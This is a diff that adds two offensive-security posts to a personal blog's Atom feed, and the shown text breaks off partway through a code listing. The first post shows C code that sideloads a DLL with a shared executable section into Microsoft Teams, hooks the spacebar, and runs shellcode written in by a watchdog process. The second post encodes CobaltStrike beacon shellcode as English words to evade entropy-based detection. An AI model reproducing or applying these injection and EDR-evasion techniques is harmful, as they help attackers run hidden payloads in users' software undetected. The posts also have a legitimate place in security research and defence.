@@ -3,12 +3,390 @@
  <title>The blog of Riley Kidd</title>
  <link href="https://rileykidd.com/atom.xml" rel="self"/>
  <link href="https://rileykidd.com"/>
- <updated>2020-05-25T05:19:28-05:00</updated>
+ <updated>2022-07-07T01:03:28-05:00</updated>
  <id>https://rileykidd.com</id>
  <author>
    <name>Riley Kidd</name>
    <email></email>
  </author>
+ 
+ <entry>
+   <title>Shared section code execution</title>
+   <link href="https://rileykidd.com/2022/06/21/shared-section-code-execution/"/>
+   <updated>2022-06-21T04:30:00-05:00</updated>
+   <id>https://rileykidd.com/2022/06/21/Shared_section_code_execution</id>
+   <content type="html">&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
+&lt;p&gt;This post will demonstrate how to utilise shared sections within a DLL to execute memory in a remote process.&lt;/p&gt;
+
+&lt;p&gt;The information presented in this post references and builds upon the existing work of &lt;a href=&quot;https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/&quot;&gt;Bill Demirkapi&lt;/a&gt; and &lt;a href=&quot;https://code.google.com/archive/p/dll-shared-sections/&quot;&gt;Gynvael Coldwind&lt;/a&gt;. For additional context and background, you should review their existing works.&lt;/p&gt;
+
+&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
+&lt;p&gt;A ‘typical’ setup to execute code in a remote process involves making use of win32 API calls (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;OpenProcess&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAllocEx&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteProcessMemory&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateRemoteThread&lt;/code&gt;) to obtain a handle to a remote process, allocate memory within the process, write shellcode to the process, and finally execute the shellcode in a remote thread.&lt;/p&gt;
+
+&lt;p&gt;There are a number of different approaches and win32 API call combinations which can be utilised to perform code execution in a remote process, however Endpoint Detection and Response (EDR) tooling can be a bit of a kill joy with &lt;a href=&quot;https://github.com/Mr-Un1k0d3r/EDRs&quot;&gt;user mode hooks&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Rather than relying on known win32 API call chains to achieve remote code execution, we can instead make use of shared sections to achieve the same result.&lt;/p&gt;
+
+&lt;h2 id=&quot;shared-sections&quot;&gt;Shared sections&lt;/h2&gt;
+&lt;p&gt;Windows &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/debug/pe-format&quot;&gt;Portable Executable&lt;/a&gt; (PE) files contain different “sections” which are areas within the file containing different information required for successful execution. For example, the &lt;em&gt;.text&lt;/em&gt; section will typically contain executable code, while the &lt;em&gt;.rsrc&lt;/em&gt; section will typically contain resources.&lt;/p&gt;
+
+&lt;p&gt;Each section has “characteristics” which indicate how the section can be used. For example &lt;em&gt;IMAGE_SCN_MEM_EXECUTE&lt;/em&gt; allows the section to be executed as code, &lt;em&gt;IMAGE_SCN_MEM_READ&lt;/em&gt; allows the section to be read, and &lt;em&gt;IMAGE_SCN_MEM_WRITE&lt;/em&gt; allows the section to be written to.&lt;/p&gt;
+
+&lt;p&gt;A less common, but still valid section characteristic is &lt;em&gt;IMAGE_SCN_MEM_SHARED&lt;/em&gt; which allows the section to be shared in memory.&lt;/p&gt;
+
+&lt;p&gt;For an offensive security blog post - what does this mean in practise?&lt;/p&gt;
+
+&lt;p&gt;It means we can have two separate processes, who both share the exact same data in memory (without needing to involve any API calls such as &lt;code class=&quot;highlighter-rouge&quot;&gt;NtMapViewOfSection&lt;/code&gt;). This shared memory therefore enables us to modify memory in another process, which can affect its execution.&lt;/p&gt;
+
+&lt;h2 id=&quot;definitions-and-techniques&quot;&gt;Definitions and techniques&lt;/h2&gt;
+&lt;p&gt;To keep this post as focused on the shared memory concept as possible, we will need to skip over a few definitions and techniques you should be familiar with:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://cihansol.com/blog/index.php/2021/09/14/windows-dll-proxying-hijacking/&quot;&gt;DLL Proxying/Hijacking&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://sekuro.io/blog/eavesdropping-is-listening-enough/&quot;&gt;DLL Side Loading&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate&quot;&gt;Keypress Hooking&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;plan-of-attack&quot;&gt;Plan of attack&lt;/h2&gt;
+&lt;p&gt;We can plan to abuse shared sections by performing a few steps:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create a DLL which has a shared section&lt;/li&gt;
+  &lt;li&gt;Side load the DLL into a process such as Microsoft Teams and create a new thread&lt;/li&gt;
+  &lt;li&gt;Hook a common key used in Teams, such as the spacebar&lt;/li&gt;
+  &lt;li&gt;Once a user presses spacebar within Teams, set a flag in shared memory&lt;/li&gt;
+  &lt;li&gt;A watchdog process (which has also loaded the DLL and now shares memory with Teams) can identify the changed flag in shared memory&lt;/li&gt;
+  &lt;li&gt;The watchdog process can write shellcode into the shared memory&lt;/li&gt;
+  &lt;li&gt;The Teams thread can identify that shellcode has been written to shared memory, and can now execute it&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;There are a few advantages to this plan of attack, when compared with a “traditional” approach:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Execute shellcode in a remote process without using suspicious win32 API call chains&lt;/li&gt;
+  &lt;li&gt;The side loaded DLL itself is (relatively) benign and doesn’t directly contain any useful information for an analyst or responder (changes to shared memory are not saved to disk)&lt;/li&gt;
+  &lt;li&gt;No interaction or handles to the “injectee” process are required (other than sideloading)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As well as some disadvantages:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Need to write the DLL file to disk in order to side load&lt;/li&gt;
+  &lt;li&gt;Need to perform DLL sideloading (using the DLL in the step above)&lt;/li&gt;
+  &lt;li&gt;Need to have a secondary watchdog process to monitor, write, and contain the actual payload shellcode&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;IMAGE_SCN_MEM_SHARED&lt;/em&gt; is an uncommon section flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ignoring the advantages and disadvantages - let’s just break this down into parts and execute upon our plan of attack.&lt;/p&gt;
+
+&lt;h2 id=&quot;creating-a-shared-section&quot;&gt;Creating a shared section&lt;/h2&gt;
+&lt;p&gt;Rather than searching for a shared section in an existing binary or DLL, we can instead just create out own. Within Visual Studio we can create a new DLL, then modify a section (such as &lt;em&gt;.data&lt;/em&gt;) during compilation by providing &lt;code class=&quot;highlighter-rouge&quot;&gt;/SECTION:.data,ERSW&lt;/code&gt;  as an additional option during the compilation process:
+&lt;a href=&quot;/assets/images/Pasted image 20220526113939.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220526113939.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Adding these additional compilation options enables the DLL &lt;em&gt;.data&lt;/em&gt; section to be readable, writeable, executable, and shared. We can confirm the section characteristics using &lt;code class=&quot;highlighter-rouge&quot;&gt;dumpbin.exe /SECTION:.data test.dll&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SECTION HEADER #4
+   .data name
+      34 virtual size
+    6000 virtual address (0000000180006000 to 0000000180006033)
+     200 size of raw data
+    3600 file pointer to raw data (00003600 to 000037FF)
+       0 file pointer to relocation table
+       0 file pointer to line numbers
+       0 number of relocations
+       0 number of line numbers
+F0000040 flags
+         Initialized Data
+         Shared
+         Execute Read Write
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the dumpbin output, we can see the DLL &lt;em&gt;.data&lt;/em&gt; section is set with the expected characteristic flags of &lt;code class=&quot;highlighter-rouge&quot;&gt;F0000040&lt;/code&gt; which can be calculated by exclusive or’ing the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics&quot;&gt;separate section values&lt;/a&gt; together (including &lt;em&gt;IMAGE_SCN_CNT_INITIALIZED_DATA&lt;/em&gt; due to the default purpose of the &lt;em&gt;.data&lt;/em&gt; section).&lt;/p&gt;
+
+&lt;h2 id=&quot;finding-the-shared-section&quot;&gt;Finding the shared section&lt;/h2&gt;
+&lt;p&gt;Now we have created a DLL with a shared section, we need to be able to resolve and find the location of that shared section in memory. That way, we know where the shared data section resides and can use it to read and write across the separate processes.&lt;/p&gt;
+
+&lt;p&gt;In order to do that on an x64 system, we need to be able to search for the section:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Obtain a handle to the loaded image base address&lt;/li&gt;
+  &lt;li&gt;Locate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ImageNtHeader&lt;/code&gt; structure&lt;/li&gt;
+  &lt;li&gt;Calculate a pointer to the first/current section&lt;/li&gt;
+  &lt;li&gt;Compare the current section name (or anything) with the section we are searching for&lt;/li&gt;
+  &lt;li&gt;Increment the current section pointer to continue our search to the next section&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can export the function too, since this is a DLL, and we will want to use similar functionality from the watchdog process:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;extern &quot;C&quot;
+__declspec(dllexport) LPVOID section_find(const char *section) {
+    HINSTANCE hGetProcIDDLL = (HMODULE)&amp;amp;__ImageBase;
+    PIMAGE_NT_HEADERS64 NtHeader = ImageNtHeader(hGetProcIDDLL);
+    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(NtHeader);
+
+    for (int i = 0; i &amp;lt; NtHeader-&amp;gt;FileHeader.NumberOfSections; i++) {
+        if (strcmp((const char*)section_header-&amp;gt;Name, section) == 0) {
+            return ((BYTE*)hGetProcIDDLL + section_header-&amp;gt;VirtualAddress);
+        }
+        section_header++;
+    }
+    return NULL;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we can resolve the location of the shared section in memory, we can start to use it.&lt;/p&gt;
+
+&lt;h2 id=&quot;signalling-via-the-shared-section&quot;&gt;Signalling via the shared section&lt;/h2&gt;
+&lt;p&gt;We can choose 2 locations in the shared section to use for signalling between the watchdog and side loaded processes. Locations will need to be chosen based on the section purpose and space required. A good place to look for ‘dead’ space is at the end of a section (since they will need to be page aligned).&lt;/p&gt;
+
+&lt;p&gt;Once chosen, we can export the locations from within the DLL too, since the offsets need to be shared between the processes:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;extern &quot;C&quot;
+__declspec(dllexport) int check_offset() {
+    return 255;
+}
+
+extern &quot;C&quot;
+__declspec(dllexport) int write_offset() {
+    return 256;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once defined, we can start to use these functions to resolve the shared section and calculate the offset locations:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;LPVOID data_section = section_find(&quot;.data&quot;);
+LPVOID data_check = (BYTE*)data_section + check_offset();
+LPVOID data_write = (BYTE*)data_section + write_offset();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For our use case, the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_check&lt;/code&gt; location will be used to signal that the spacebar has been pressed in Teams, while the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_write&lt;/code&gt; location will be where the watchdog process will write the actual shellcode.&lt;/p&gt;
+
+&lt;p&gt;With the locations resolved, we can now setup some functionality within a loop in our DLL thread to signal the watchdog (via the shared section). When the spacebar is pressed, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41&lt;/code&gt; will be written to the shared memory &lt;code class=&quot;highlighter-rouge&quot;&gt;data_check&lt;/code&gt; location (which currently contains &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt;):&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;if (GetAsyncKeyState(VK_SPACE) &amp;amp; 0x80000) {
+    *((BYTE*)data_check) = (byte)0x41;
+    set_byte = true;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;monitoring-the-shared-section&quot;&gt;Monitoring the shared section&lt;/h2&gt;
+&lt;p&gt;With the functionality setup to find and write to shared memory from the DLL, we next need to create the separate watchdog process to monitor and write the actual shellcode.&lt;/p&gt;
+
+&lt;p&gt;We can make use of existing functionality in the DLL (which we need to load anyway) by defining the functions, loading the DLL, and resolving the addresses of the functions already written:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;typedef LPVOID(__cdecl* dll_section_find)(const char*);
+typedef int(__cdecl* dll_write_offset)();
+typedef int(__cdecl* dll_check_offset)();
+
+dll_section_find section_find;
+dll_write_offset write_offset;
+dll_check_offset check_offset;
+
+HINSTANCE hGetProcIDDLL = LoadLibrary(L&quot;test.dll&quot;);
+section_find = (dll_section_find)GetProcAddress(hGetProcIDDLL, &quot;section_find&quot;);
+write_offset = (dll_write_offset)GetProcAddress(hGetProcIDDLL, &quot;write_offset&quot;);
+check_offset = (dll_check_offset)GetProcAddress(hGetProcIDDLL, &quot;check_offset&quot;);
+
+LPVOID data_section = section_find(&quot;.data&quot;);
+LPVOID data_write = (BYTE*)data_section + write_offset();
+LPVOID data_check = (BYTE*)data_section + check_offset();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we have resolved the functions and shared memory locations, the watchdog process can enter a loop and write our shellcode to the shared memory location once the monitored &lt;code class=&quot;highlighter-rouge&quot;&gt;data_check&lt;/code&gt; byte has changed from the original value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt; :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;while (true){
+  if (*((BYTE*)data_check) != (BYTE)0x00) {
+    memcpy(data_write, buf, size);
+    return 1;
+  }
+  Sleep(1000);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;shellcode-execution&quot;&gt;Shellcode execution&lt;/h2&gt;
+&lt;p&gt;Once the shellcode has been written to the shared memory location, the last step is to execute it inline from within the side loaded Teams process, without making use of any additional win32 helper API calls.&lt;/p&gt;
+
+&lt;p&gt;In order to achieve this, we can monitor the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_write&lt;/code&gt; location and if we have signalled the write by updating the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_check&lt;/code&gt; location (by pressing the spacebar earlier from within Teams) and the data has changed from the original value (again of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt;), we can jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_write&lt;/code&gt; location and directly execute the shellcode located there:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;if (*((BYTE *)data_write) != (byte)0x00 &amp;amp;&amp;amp; set_byte) {
+     ((void (*)(void))data_write)();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Due to our chosen method of execution via a thread, we should also take care to exit cleanly and avoid killing the parent process. For example, if using &lt;em&gt;msfvenom&lt;/em&gt; to create the final shellcode, we can select to exit the thread, not the process: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;taking-it-for-a-spin&quot;&gt;Taking it for a spin&lt;/h2&gt;
+&lt;p&gt;With the preparation work out of the way, we can compile the watchdog process and the shared memory section DLL. In order to keep Teams working as expected after side loading, we will also need to setup function redirects. A candidate DLL &lt;code class=&quot;highlighter-rouge&quot;&gt;srvcli.dll&lt;/code&gt; was identified (using &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/procmon&quot;&gt;Procmon&lt;/a&gt;) and used for testing this proof of concept (with our version of the &lt;code class=&quot;highlighter-rouge&quot;&gt;srvcli.dll&lt;/code&gt; file added to the &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\&amp;lt;user&amp;gt;\AppData\Local\Microsoft\Teams\current\&lt;/code&gt; directory).&lt;/p&gt;
+
+&lt;p&gt;After compiling and executing the watchdog process, we can see the resolution of the section, memory addresses, and functions we are interested in:
+&lt;a href=&quot;/assets/images/Pasted image 20220607154751.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607154751.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;With the watchdog process running, we can restart teams (with the DLL side loaded) and we can similarly see the exact same shared memory address locations in the debug output:
+&lt;a href=&quot;/assets/images/Pasted image 20220607154915.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607154915.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Pressing the spacebar from within Teams, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41&lt;/code&gt; has been written to the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_offset&lt;/code&gt; location in shared memory:
+&lt;a href=&quot;/assets/images/Pasted image 20220607154949.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607154949.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Updating the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_offset&lt;/code&gt; shared memory byte from within Teams, causes the watchdog process to write shellcode to the &lt;code class=&quot;highlighter-rouge&quot;&gt;data_write&lt;/code&gt; location. Once the shellcode has been written, the thread within Teams will finally execute the shellcode:
+&lt;a href=&quot;/assets/images/Pasted image 20220607155016.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607155016.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;By directly leveraging shared sections, an attacker is able to modify the memory of another process (by modifying the memory of its own process) without needing to interface with any potentially monitored or “suspicious” win32 API calls.&lt;/p&gt;
+
+&lt;p&gt;While this approach has some advantages, there are also some unique Tactics, Techniques, and Procedures (TTPs) which would enable relatively low false-positive detections.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Obfuscating shellcode entropy</title>
+   <link href="https://rileykidd.com/2022/06/10/obfuscating-shellcode-entropy/"/>
+   <updated>2022-06-10T04:30:00-05:00</updated>
+   <id>https://rileykidd.com/2022/06/10/Obfuscating_shellcode_entropy</id>
+   <content type="html">&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
+&lt;p&gt;Some weeks ago, an ex-colleague of mine put together an interesting blogpost outlining ideas and resources to evade Endpoint Detection and Response solutions. The post is not ‘point and shoot’, but it does provide a roadmap and current ‘good practise’ ideas to create a loader which can bypass current technologies.&lt;/p&gt;
+
+&lt;p&gt;I recommend you take a look at Vincent’s post for context: &lt;a href=&quot;https://vanmieghem.io/blueprint-for-evading-edr-in-2022/&quot;&gt;A blueprint for evading industry leading endpoint protection in 2022&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The closing “It’s a cat and mouse game, and the cat is undoubtedly getting better” comment also demonstrates how much harder you have to work now to bypass security products, compared with the &lt;a href=&quot;https://rileykidd.com/2013/06/17/modern-malware-the-game-of-cat-and-mouse/&quot;&gt;good old days&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;omission&quot;&gt;Omission&lt;/h2&gt;
+&lt;p&gt;Vincent’s post includes resources and implementations for a few of the proposed steps, but he also included an unimplemented idea in the ‘Reducing entropy’ section:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A more elegant solution would be to design and implement an algorithm that would obfuscate (encode/encrypt) the shellcode into English words (low entropy). That would kill two birds with one stone.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Entropy (randomness) can be used as an indicator of ‘badness’ by a security product, as high entropy can indicate that a binary is packed or encrypted - so let’s try to decrease our entropy (higher = more random, lower = less random).&lt;/p&gt;
+
+&lt;p&gt;This is an interesting idea, let’s think about a potential solution.&lt;/p&gt;
+
+&lt;h2 id=&quot;simplistic-solution&quot;&gt;Simplistic Solution&lt;/h2&gt;
+&lt;p&gt;Shellcode is simply an array of bytes with values ranging from 0x00 to 0xff. Rather than including raw or encrypted shellcode (which may have relatively high entropy), we can instead use the shellcode’s value as an index into some other array, as a type of &lt;a href=&quot;https://en.wikipedia.org/wiki/Substitution_cipher&quot;&gt;Substituion Cipher&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The other array, could be comprised of anything, but let’s choose English words of the same length, (you’ll see why the same length is useful later) - then rather than including the raw shellcode, we could instead include the sequence of English words based on the original shellcode values index (just like a hashmap).&lt;/p&gt;
+
+&lt;p&gt;For example, if we have the following &lt;code class=&quot;highlighter-rouge&quot;&gt;english_words&lt;/code&gt; array and some &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; we want to encode:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;english_words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bank&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;base&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;beat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x01\x02\x03\x02\x01\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We could instead rewrite (or encode) our shellcode by performing a substitution based on the English word at the relevant index. In this case, ‘bank’ which is located at index 0 would replace the 0x00th byte, ‘base’ which is located at index 1 would replace the 0x1st byte and so on to create the encoded representation:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bank base bear beat bear base bank&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using this substitution approach, we can then use  &lt;code class=&quot;highlighter-rouge&quot;&gt;bank base bear beat bear base bank&lt;/code&gt; as our shellcode, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;\x00\x01\x02\x03\x02\x01\x00&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can also include Vincent’s “Shellcode encryption” step too, with a high-level process:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Have an array of 255 words, which are of equal length&lt;/li&gt;
+  &lt;li&gt;Randomly shuffle the array of 255 words&lt;/li&gt;
+  &lt;li&gt;RC4 encrypt the base shellcode&lt;/li&gt;
+  &lt;li&gt;Based on the index - substitute each byte of the RC4 encrypted shellcode, with the corresponding word from the randomly shuffled array&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Shellcode execution would follow similar, but differently ordered steps:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Based on the word - recreate the encrypted shellcode by substituting each byte with the corresponding index from the randomly shuffled array of 255 words&lt;/li&gt;
+  &lt;li&gt;RC4 decrypt the encrypted shellcode&lt;/li&gt;
+  &lt;li&gt;???&lt;/li&gt;
+  &lt;li&gt;Execute&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;consistent-word-length&quot;&gt;Consistent word length&lt;/h2&gt;
+&lt;p&gt;Using an array of words of the same length keeps things simple when we are unencoding the shellcode. We can just jump to the next ‘word length’ offset in the array of words (and then lookup that corresponding index in the 255 word array). In this example I’ve used a word length of 5 (including the null byte). Any length will do, but will increase the resulting file size.&lt;/p&gt;
+
+&lt;p&gt;A nicer solution could make use of some offsets, or compression (such as &lt;a href=&quot;https://en.wikipedia.org/wiki/Huffman_coding&quot;&gt;Huffman coding&lt;/a&gt;), but for the purposes of this post (and increasing entropy) - let’s keep it simple.&lt;/p&gt;
+
+&lt;h2 id=&quot;control-case&quot;&gt;Control Case&lt;/h2&gt;
+&lt;p&gt;That’s the high-level approach, so let’s start with a control so we can compare results. I’ll create and store to disk a no-frills stageless CobaltStrike beacon shellcode, which is 265728 bytes in length.&lt;/p&gt;
+
+&lt;p&gt;We can then include the raw shellcode, allocate executable memory, copy the shellcode into the executable memory and execute inline:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;LPVOID mem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (mem) {
+        memcpy(mem, shellcode, shellcode_length);
+        ((void (*)(void))mem)();
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once compiled, we can upload the compiled binary to VirusTotal for some analysis. The &lt;a href=&quot;https://www.virustotal.com/gui/file/884e3b1a661d7f4355557a7b61fdb7b7d721e3e595548e58398edd0f2dc37e0e/detection&quot;&gt; results&lt;/a&gt; are interesting (concerning?) with only “27 security vendors and 2 sandboxes flag(ing) this file as malicious”. We can also see a number of the products correctly recognise and signature CobaltStrike directly with detections for “Win.Trojan.CobaltStrike-8091534-0” and “Generic.Beacon.B.9B919E05”.&lt;/p&gt;
+
+&lt;p&gt;Let’s also take a look at the entropy of the shellcode too using &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;:
+&lt;a href=&quot;/assets/images/Pasted image 20220607094528.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607094528.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The entropy of our shellcode is quite high with an entropy value of 6.375457812458179. On a scale of 0 to 8, normal English text will typically fall between 3.5 and 5, while encrypted or compressed data will typically have a value of more than 7.5.&lt;/p&gt;
+
+&lt;h2 id=&quot;test-case&quot;&gt;Test Case&lt;/h2&gt;
+&lt;p&gt;Now we have our control binary and results, let’s setup our test case. Using Python, we can follow the high-level steps above to encrypt and then encode our CobaltStrike beacon shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;arc4&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARC4&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ascii_strings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Ably'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Afar'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Area'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Army'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Away'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Baby'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Back'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ball'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Band'&lt;/span&gt;&lt;span 